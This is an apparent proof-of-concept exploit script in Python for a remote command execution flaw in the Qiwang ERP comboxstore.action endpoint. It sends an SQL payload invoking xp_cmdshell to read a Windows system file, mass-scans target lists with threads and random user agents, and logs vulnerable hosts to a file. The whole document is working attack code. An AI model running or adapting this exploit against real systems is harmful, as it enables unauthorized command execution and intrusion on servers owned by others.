import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import re
import random
#title="掌上校园服务管理平台"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list=[]

def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

proxies={'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'}

def wirte_targets(vurl, filename):
	with open(filename, "a+") as f:
		f.write(vurl + "\n")

def check_url(url):
	url=parse.urlparse(url)
	hostname  = url.hostname
	url=url.scheme + '://' + url.netloc
	rceurl = url + "/mainFunctions/comboxstore.action"
	headers = {
		'User-Agent': get_ua(),
		"Content-Type":"application/x-www-form-urlencoded"
	}
	data = "comboxsql=exec%20xp_cmdshell%20'type%20C:\\Windows\\Win.ini'"
	try:
		res = requests.post(rceurl, verify=False,headers=headers ,data=data,allow_redirects=False, timeout=15)
		#rsp_token = re.findall(r'setup-token":"(.*?)",', res1.text, re.DOTALL)[0]
		if res.status_code == 200 and "fonts" in res.text:
			print("\033[32m[+] {} is vulnerable. \033[0m".format(rceurl))
			wirte_targets(url,"vuln.txt")
		else:
			print("\033[34m[-] {} Command execution failed.\033[0m".format(url))
			pass
	except Exception as e:
		print("\033[34m[!]{} is timeout.\033[0m".format(rceurl))		

def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_url, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''

	企望制造 ERP comboxstore.action RCE
	                                                                    
                                 poc By when
	'''
	print(show + '\n')
	arg=ArgumentParser(description='check_url By when')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:python3 QiwangERP_RCE.py -u http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="Target URL; Example:python3 QiwangERP_RCE.py -f url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	print("[+]任务开始.....")
	start=time()
	if url != None and filename == None:
		check_url(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成,用时{}s.'.format(end-start))
